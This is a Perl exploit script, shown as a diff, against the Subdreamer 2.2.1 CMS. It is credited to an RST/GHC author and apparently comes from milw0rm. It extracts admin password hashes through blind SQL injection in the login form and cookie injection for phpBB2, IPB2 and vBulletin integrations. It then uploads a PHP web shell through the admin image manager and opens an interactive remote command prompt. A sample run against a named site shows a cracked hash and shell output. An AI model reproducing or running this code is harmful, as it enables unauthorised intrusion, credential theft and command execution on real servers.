@@ -1,0 +1,393 @@
+#!/usr/bin/perl
+
+## Subdreamer 2.2.1 command exec exploit
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+## supported targets:
+##  ~ without forum integration
+##  ~ with phpBB2 integration
+##  ~ with ipb2 integration
+##  ~ with vbulletin2 integration
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+## based on RST/GHC advisory #35
+## http://rst.void.ru/papers/advisory35.txt
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+## (c)oded by 1dt.w0lf - 19/09/2005
+## RST/GHC
+## http://rst.void.ru
+## http://ghc.ru
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+## work:
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+## r57subdreamer.pl -p http://subdreamer.com.ru/ -u 2 -t 1
+## ------------------------------------------------------------------
+## [~]   PATH : http://subdreamer.com.ru/
+## [~]   USER : 2
+## [~] TARGET : 1 - PhpBB2
+## [1] STEP 1 : TRY GET USER PASSWORD
+## [~] SEARCHING PASSWORD ... [ DONE ]
+## -----------------------------------------------------------
+##  USER_ID: 2
+##     PASS: 26310e438a5a1fb8622738f1e5d34f8b
+## -----------------------------------------------------------
+## [2] STEP 2 : CHECK WHAT USER HAVE ACCESS TO ADMIN ZONE
+## [+] DONE! THIS USER HAVE ACCESS!
+## [3] STEP 3 : UPLOAD FILE
+## [+] DONE! FILE "img.php" UPLOADED
+## [+] WELL DONE! NOW YOU CAN EXECUTE COMMANDS! =)
+## SUBDREAMER# id; uname -a; ls -la;
+## ----------------------------------------------------------------
+## uid=1003(apache) gid=1003(apache) groups=1003(apache)
+## FreeBSD customer-3314.cit-network.net 5.3-RELEASE FreeBSD 5.3-RELEASE #0:
+## Fri Nov  5 04:19:18 UTC 2004     root@harlow.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
+## total 24
+## drwxrwxrwx   5 enshteyn  apache  512 Sep 19 23:04 .
+## drwxr-x---  10 enshteyn  apache  512 Sep 17 21:03 ..
+## drwxr-xr-x   2 enshteyn  apache  512 Sep 10 14:09 Image
+## -rw-r--r--   1 apache    apache   48 Sep 19 23:04 img.php
+## drwxrwxrwx   2 enshteyn  apache  512 Sep 10 14:09 logos
+## drwxrwxrwx   2 enshteyn  apache  512 Sep 10 14:09 smilies
+## ----------------------------------------------------------------
+## SUBDREAMER# exit
+## @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+## config
+## ------
+##
+## images folder
+$img_folder = 'images';
+## or try
+##$img_folder = 'images/logos';
+##
+## end config
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+use Getopt::Std;
+
+getopts('u:p:h:t:');
+
+$path = $opt_p;
+$user = $opt_u;
+$hash = $opt_h;
+$target = $opt_t || 0;
+
+$s_num = 1;
+$|++;
+$n = 0;
+
+@targets = (
+#['target name','colimn1 in database','colimn2 in database','cookie name 1','cookie name 2']
+ ['Subdreamer without forum','userid','password','sduserid','sdpassword'],
+ ['PhpBB2','user_id','user_password','phpbb2mysql_data',''],
+ ['IPB2','id','member_login_key','member_id','pass_hash'],
+ ['PhpBB2 cookie injection','','','phpbb2mysql_data',''],
+ ['IPB2 cookie injection','id','','member_id','pass_hash'],
+ ['Vbulletin cookie injection','userid','','bbuserid','bbpassword'],
+);
+
+if (!$path || !$user || $target<0 || $target>5) { &usage; }
+&head();
+if($path=~/[^\/]$/) { $path .= '/'; }
+print "[~]   PATH : $path\r\n";
+print "[~]   USER : $user\r\n";
+print "[~] TARGET : $target - $targets[$target][0]\r\n";
+if($target==1||$target==2||$target==0) {
+print "[1] STEP 1 : TRY GET USER PASSWORD\r\n";
+if(!$hash){
+print "[~] SEARCHING PASSWORD ... [|]";
+
+FIND: while(1)
+{
+if(&found(47,58)==0) { &found(96,103); } 
+$char = $i;
+if ($char=="0") 
+ { 
+ if(length($allchar) > 0){
+ print qq{\b\b DONE ] 
+-----------------------------------------------------------
+ USER_ID: $user
+    PASS: $allchar
+-----------------------------------------------------------
+};
+ last FIND;
+ }
+ else
+ {
+ print "\b\b FAILED ]";
+ }
+ exit(); 
+ }
+else 
+ {  
+ $allchar .= chr($char); 
+ }
+$s_num++;
+}
+}
+else
+{
+print "[~] SKIP. HASH EXISTS\r\n"; 
+$allchar = $hash;
+}
+}
+
+print "[2] STEP 2 : CHECK WHAT USER HAVE ACCESS TO ADMIN ZONE\r\n";
+if(&check_admin_rights())
+ {
+ print "[+] DONE! THIS USER HAVE ACCESS!\r\n"; 
+ }
+else
+ {
+ print "[-] DAMN! THIS USER NOT ADMIN =(\r\n"; 
+ exit();
+ }
+
+print "[3] STEP 3 : UPLOAD FILE\r\n";
+if(&upload_file())
+ {
+ print "[+] DONE! FILE \"img.php\" UPLOADED\r\n"; 
+ }
+else
+ { 
+ print "[-] DAMN! UPLOAD ERROR =(\r\n"; 
+ exit();
+ }
+print "[+] WELL DONE! NOW YOU CAN EXECUTE COMMANDS! =)\r\n"; 
+
+while ()
+ {
+    print "SUBDREAMER# ";
+    while(<STDIN>)
+     {
+        $cmd=$_;
+        chomp($cmd);
+        exit() if ($cmd eq 'exit');
+        last;
+     }
+    &run($cmd);
+ }
+ 
+sub found($$)
+ {
+ my $fmin = $_[0];
+ my $fmax = $_[1];
+ if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
+ 
+ $r = int($fmax - ($fmax-$fmin)/2);
+ $check = " BETWEEN $r AND $fmax";
+ if ( &check($check) ) { &found($r,$fmax); }
+ else { &found($fmin,$r); }
+ }
+ 
+sub crack($$)
+ {
+ my $cmin = $_[0];
+ my $cmax = $_[1];
+ $i = $cmin;
+ while ($i<$cmax)
+  {
+  $crcheck = "=$i";
+  if ( &check($crcheck) ) { return $i; }
+  $i++;
+  }
+ $i = 0;
+ return $i;
+ }
+ 
+sub check($)
+ {
+ $n++;
+ status();
+ $ccheck = $_[0];
+ $username = "no_such_user' OR (".$targets[$target][1]."=".$user." AND (ascii(substring(".$targets[$target][2].",".$s_num.",1))".$ccheck.")) /*";
+  
+ $xpl = LWP::UserAgent->new() or die;
+ $res = $xpl->post($path.'index.php',
+ {
+ "loginusername" => $username,
+ "loginpassword" => "nap0Jlb_Haxep",
+ "login"         => "login",
+ "Submit now"    => "Login"
+ }
+ ); 
+ @results = $res->content; 
+ 
+ foreach $result(@results)
+  {
+  if ($result =~ /(Database error)|(Invalid SQL)/i)
+   {
+   print "\r\n[-] SQL SYNTAX ERROR! CHECK TARGET!\r\n"; 
+   exit();
+   }
+  #print $result;
+  # english pattern
+  if ($result =~ /Wrong Password/) { return 1; }
+  # russian pattern
+  if ($result =~ /...... ......./) { return 1; }
+  # russian pattern 2
+  if ($result =~ /............ ....../) { return 1; }
+  # russian pattern 3 ( KOI8-R tested on subdreamer.com.ru )
+  if ($result =~ /...... ......./) { return 1; }
+  }
+ return 0;
+ }
+ 
+sub status()
+{
+  $status = $n % 5;
+  if($status==0){ print "\b\b/]";  }
+  if($status==1){ print "\b\b-]";  }
+  if($status==2){ print "\b\b\\]"; }
+  if($status==3){ print "\b\b|]";  }
+}
+
+sub check_admin_rights()
+ {
+ $xpl = LWP::UserAgent->new() or die;
+ $cookie_jar = HTTP::Cookies->new( );
+ $xpl->cookie_jar( $cookie_jar );
+ ($host = $path) =~ s!http://([^/]*).*!$1!;
+
+if($target == 1)
+  {
+  # not default phpbb2 cookie, work for subdreamer.com.ru ... maybe default for subdreamer pro RU ???
+  #$cookie_jar->set_cookie( "0",$targets[$target][3], 'autologinid='.$allchar.'|userid='.$user,"/",$host,,,,,);
+  # default phpbb2 cookie  
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A32%3A%22".$allchar."%22%3Bs%3A6%3A%22userid%22%3Bs%3A".length($user)."%3A%22".$user."%22%3B%7D","/",$host,,,,,);
+  }
+ elsif($target == 3)
+  {
+  # phpbb2 cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A3%3A%22666%22%3Bs%3A6%3A%22userid%22%3Bs%3A".(length($user)+4)."%3A%22".$user."%27+%2F%2A%22%3B%7D","/",$host,,,,,);  
+  }
+ elsif($target == 4)
+  {
+  # ipb2 cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"666\\","/",$host,,,,,);  
+  $cookie_jar->set_cookie( "1",$targets[$target][4],"/**/OR/**/".$targets[$target][2]."=".$user."","/",$host,,,,,);
+  }
+ elsif($target == 5)
+  {
+  # Vbulletin cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"666\\","/",$host,,,,,);  
+  $cookie_jar->set_cookie( "1",$targets[$target][4],"/**/OR/**/".$targets[$target][2]."=".$user."","/",$host,,,,,);
+  }
+ else
+  {
+  # subdreamer || ipb2 cookies
+  $cookie_jar->set_cookie( "0",$targets[$target][3], $user,"/",$host,,,,,);
+  $cookie_jar->set_cookie( "1",$targets[$target][4], $allchar,"/",$host,,,,,);
+  }
+  
+ $res = $xpl->get($path."admin/index.php");
+ if($res->content =~ /loginpassword/) { return 0; }
+ else { return 1; }
+ }
+
+sub upload_file()
+ {
+ $xpl = LWP::UserAgent->new() or die;
+ $cookie_jar = HTTP::Cookies->new( );
+ $xpl->cookie_jar( $cookie_jar );
+ ($host = $path) =~ s!http://([^/]*).*!$1!;
+ 
+ if($target == 1)
+  {
+  # not default phpbb2 cookie, work for subdreamer.com.ru ... maybe default for subdreamer pro RU ???
+  #$cookie_jar->set_cookie( "0",$targets[$target][3], 'autologinid='.$allchar.'|userid='.$user,"/",$host,,,,,);
+  # default phpbb2 cookie
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A32%3A%22".$allchar."%22%3Bs%3A6%3A%22userid%22%3Bs%3A".length($user)."%3A%22".$user."%22%3B%7D","/",$host,,,,,);
+  }
+ elsif($target == 3)
+  {
+  # phpbb2 cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A3%3A%22666%22%3Bs%3A6%3A%22userid%22%3Bs%3A".(length($user)+4)."%3A%22".$user."%27+%2F%2A%22%3B%7D","/",$host,,,,,);  
+  }
+ elsif($target == 4)
+  {
+  # ipb2 cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"666\\","/",$host,,,,,);  
+  $cookie_jar->set_cookie( "1",$targets[$target][4],"/**/OR/**/".$targets[$target][2]."=".$user."","/",$host,,,,,);
+  }
+ elsif($target == 5)
+  {
+  # Vbulletin cookie with sql injection
+  $cookie_jar->set_cookie( "0",$targets[$target][3],"666\\","/",$host,,,,,);  
+  $cookie_jar->set_cookie( "1",$targets[$target][4],"/**/OR/**/".$targets[$target][2]."=".$user."","/",$host,,,,,);
+  }
+ else
+  {
+  # subdreamer || ipb2 cookies
+  $cookie_jar->set_cookie( "0",$targets[$target][3], $user,"/",$host,,,,,);
+  $cookie_jar->set_cookie( "1",$targets[$target][4], $allchar,"/",$host,,,,,);
+  }
+  
+ $res = $xpl->post($path.'admin/imagemanager.php',Content_Type => 'form-data',
+ Content => [
+ 'action'        => 'uploadimage',
+ 'folderpath'    => "../$img_folder/",
+ 'MAX_FILE_SIZE' => '1000000',
+ 'image'   => [ 
+               undef,
+               'img.php', 
+               Content_type => 'text/plain',
+               Content => '<? if($_POST[cmd]) { passthru($_POST[cmd]); } ?>', 
+              ],
+ 'submit'        => 'Upload Image',
+ ],
+ );
+ if($res->content =~ /Settings Updated/) { return 1; }
+ if($res->content =~ /Uploading Errors/) { return 0; }
+ else { return 1; }
+ }
+
+sub run()
+ {
+ $xpl = LWP::UserAgent->new() or die;
+ $res = $xpl->post($path.$img_folder.'/img.php',{'cmd'=>$cmd}); 
+ print "----------------------------------------------------------------\r\n";
+ print $res->content;
+ print "----------------------------------------------------------------\r\n";
+ }
+
+sub usage()
+ {
+ &head();
+ print q(|                                                                    |
+| - Usage:                                                           |
+| r57subdreamer.pl -p <path> -u <user_id> [-t <target>] [-h <hash>]  |
+|     <path>    - Path to subdreamer folder                          |
+|     <user_id> - User id for bruteforce                             |
+|     <hash>    - MD5 password hash for this user if you have it =\)  |
+| - Available targets:                                               |
+|          - brute password:                                         |
+|               0 - Subdreamer without forum integration ( default ) |
+|               1 - Subdreamer with PhpBB2 integration               |
+|               2 - Subdreamer with IPB2 integration                 |
+|          - cookie sql injection, dont need brute password:         |
+|               3 - Subdreamer with PhpBB2 integration 2             |
+|               4 - Subdreamer with IPB2 integration 2               |
+|               5 - Subdreamer with Vbulletin integration            |
++--------------------------------------------------------------------+
+| e.g.:                                                              |
+| r57subdreamer.pl -p http://127.0.0.1/subdreamer/ -u 1              |
+| r57subdreamer.pl -p http://www.subdreamer.com.ru -u 2 -t 1         | 
++--------------------------------------------------------------------+
+| visit us: http://rst.void.ru , http://ghc.ru                       |
++--------------------------------------------------------------------+
+ );
+ exit();
+ }
+
+sub head()
+ {
+ print q(
++--------------------------------------------------------------------+
+| Subdreamer version 2.2.1 sql injection + command execution exploit |
+|                          by 1dt.w0lf                               |
+|                            RST/GHC                                 |
++--------------------------------------------------------------------+
+);}
+
+# milw0rm.com [2005-10-31]
